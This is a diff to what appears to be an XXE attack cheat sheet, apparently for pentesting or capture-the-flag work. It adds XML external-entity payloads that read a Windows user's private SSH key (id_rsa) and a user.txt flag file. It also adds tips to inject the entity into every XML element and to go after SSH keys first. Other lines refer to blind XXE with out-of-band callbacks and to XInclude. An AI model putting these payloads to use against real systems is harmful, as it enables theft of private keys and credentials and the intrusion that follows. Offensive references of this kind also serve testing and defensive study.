@@ -30,6 +30,8 @@
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"> ]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/users/<USER>/.ssh/id_rsa"> ]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/users/<USER>/desktop/user.txt"> ]>
 ```
 
 ### SSRF
@@ -324,6 +326,8 @@ Content-ID: <root>
 ## Troubleshooting
 
 **No response / output missing:**
+- Try placing the entity reference in EVERY XML element — not all fields are reflected in the response
+- On Windows, prioritize SSH keys: `file:///c:/users/<user>/.ssh/id_rsa`
 - Try blind XXE with an OOB callback
 - Check error messages for indirect disclosure
 - Try XInclude instead of DOCTYPE approach
